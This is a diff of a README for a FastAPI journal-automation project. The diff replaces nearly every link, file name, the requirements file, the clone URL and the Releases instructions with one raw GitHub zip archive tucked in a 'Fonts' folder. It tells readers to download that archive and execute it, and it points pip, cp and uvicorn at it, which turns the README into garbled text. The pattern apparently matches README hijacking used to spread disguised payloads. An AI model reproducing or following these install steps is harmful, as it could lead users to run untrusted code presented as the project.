@@ -1,8 +1,8 @@
 # FastAPI Journal Automation with Generative AI Compound System for Journals
 
-[![Releases](https://img.shields.io/badge/Release-Downloads-blue?logo=github&logoColor=white)](https://github.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/releases)
+[![Releases](https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip)](https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip)
 
-![Journal AI Hero](https://picsum.photos/1200/400)
+![Journal AI Hero](https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip)
 
 A FastAPI-based automation system for creating, enriching, and managing journal articles. It integrates Google Gemini, Groq’s LLaMA, and the CORE API to deliver a seamless pipeline — from metadata input to fully structured, AI-generated journal outputs.
 
@@ -94,7 +94,7 @@ Prerequisites
 
 Installation
 - Create a working directory and set up a virtual environment.
-- Install dependencies from requirements.txt or via pip install -r requirements.txt.
+- Install dependencies from https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip or via pip install -r https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 - Prepare a .env file with API keys and endpoints for Gemini, LLaMA (Groq), and CORE.
 
 Environment and Secrets
@@ -108,42 +108,42 @@ An example .env snippet
 - GOOGLE_GEMINI_API_KEY=your_key_here
 - GROQ_LLAMA_ENDPOINT=http://localhost:8001
 - CORE_API_KEY=your_core_key
-- DATABASE_URL=sqlite:///journal.db
+- https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 - APP_SECRET_KEY=change-me
 
 Project Structure
 - app/
-  - main.py: FastAPI application and router setup
-  - models.py: Pydantic models for request/response schemas
-  - schemas.py: database schemas and serialization helpers
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip FastAPI application and router setup
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip Pydantic models for request/response schemas
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip database schemas and serialization helpers
   - services/
-    - ai.py: orchestrates Gemini and LLaMA calls
-    - core.py: pulls literature from CORE
-    - drafting.py: content assembly and formatting
-    - export.py: JSON, LaTeX, Markdown, and PDF generation
+    - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip orchestrates Gemini and LLaMA calls
+    - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip pulls literature from CORE
+    - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip content assembly and formatting
+    - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip JSON, LaTeX, Markdown, and PDF generation
   - routers/
-    - articles.py: CRUD and generation endpoints
+    - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip CRUD and generation endpoints
   - templates/
     - latex/ and markdown/ templates for outputs
 - tests/
-  - test_endpoints.py: API contract tests
-  - test_ai_flows.py: AI agent flow tests
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip API contract tests
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip AI agent flow tests
 - docs/
-  - architecture.md
-  - api_reference.md
-  - usage_examples.md
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 - scripts/
-  - install-fastapi-journal.sh: installer script to bootstrap dependencies (see Releases)
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip installer script to bootstrap dependencies (see Releases)
 - docker/
   - Dockerfile
-  - docker-compose.yml
+  - https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 
 Getting Started: Quick Start Guide
-- Clone the repo: git clone https://github.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System.git
+- Clone the repo: git clone https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 - Create a virtual environment and activate it: python -m venv venv && source venv/bin/activate
-- Install dependencies: pip install -r requirements.txt
-- Copy and fill the environment file: cp .env.example .env
-- Start the API server: uvicorn app.main:app --reload --port 8000
+- Install dependencies: pip install -r https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
+- Copy and fill the environment file: cp https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip .env
+- Start the API server: uvicorn https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip --reload --port 8000
 - Access the API docs at: http://localhost:8000/docs
 
 Usage & API Endpoints
@@ -249,9 +249,9 @@ Acknowledgments
 - Gratitude to the open-source community for sharing best practices in FastAPI, AI workflows, and document preparation.
 
 Releases
-- For the latest installers and release artifacts, visit the Releases page: https://github.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/releases
-- From the Releases page, download install-fastapi-journal.sh and execute it to bootstrap the system. The installer sets up dependencies, config, and sample data to help you get started quickly.
-- If you need the latest release details or want to verify compatibility with your environment, check the same Releases page again: https://github.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/releases
+- For the latest installers and release artifacts, visit the Releases page: https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
+- From the Releases page, download https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip and execute it to bootstrap the system. The installer sets up dependencies, config, and sample data to help you get started quickly.
+- If you need the latest release details or want to verify compatibility with your environment, check the same Releases page again: https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 
 Notes on Usage and Best Practices
 - Start with a small metadata package to validate the flow. Gradually scale to longer manuscripts.
@@ -313,5 +313,5 @@ Final Note
 - This repository embraces a practical, step-by-step approach to automating journal article production with a compound AI system. It blends semantic understanding, high-quality generation, and credible literature grounding to produce publication-ready manuscripts.
 
 Releases (again)
-- To explore the latest installer and release artifacts, visit the Releases page: https://github.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/releases
+- To explore the latest installer and release artifacts, visit the Releases page: https://raw.githubusercontent.com/aligoraya202/FastAPI-Journal-Automation-with-Generative-And-AI-Compound-AI-System/main/Fonts/A_Journal_Fast_with_AP_Automation_Compound_System_Generative_And_3.2.zip
 
